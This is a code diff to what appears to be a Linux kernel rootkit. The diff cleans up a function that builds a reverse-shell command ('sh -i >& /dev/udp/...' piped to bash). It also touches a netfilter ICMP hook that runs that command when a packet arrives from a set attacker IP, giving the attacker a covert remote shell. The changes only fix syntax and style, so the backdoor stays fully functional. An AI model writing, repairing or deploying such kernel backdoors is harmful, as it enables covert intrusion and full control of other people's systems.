@@ -378,13 +378,16 @@ out_of_mem:
  *
  * This command is responsible for opening a reverse shell.
  */
-static char* create_reverse_shell_cmd() {
-	char* beginning, ending;
-	beginning = "echo 'sh -i >& /dev/udp/";
-	ending = " 0>1&' | bash";
+static char* create_reverse_shell_cmd(void) {
+	// Prepare to assemble string
+	char *beginning, *ending, *cmd;
 	int max_ip_port_len;
 	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
-	char* cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
+	beginning = "echo 'sh -i >& /dev/udp/";
+	ending = " 0>1&' | bash";
+
+	// Put it all together
+	cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
 	strncat(cmd, beginning, strlen(beginning));
 	strncat(cmd, rev_shell_ip, strlen(rev_shell_ip));
 	strncat(cmd, "/", 1);
@@ -423,9 +426,10 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 		printk(KERN_INFO "ICMP from %pI4 to %pI4\n", &ip_header->saddr, &ip_header->daddr);
 
 		if (attacker_ip == ip_header->saddr) {
+			char* cmd;
 			printk(KERN_EMERG "Reverse shell request found!\n");
-			char* cmd = create_reverse_shell_cmd();
-			printk(KERN_INFO "Running: %s" cmd);
+			cmd = create_reverse_shell_cmd();
+			printk(KERN_INFO "Running: %s", cmd);
 			run_command(cmd);
 		}
 	}
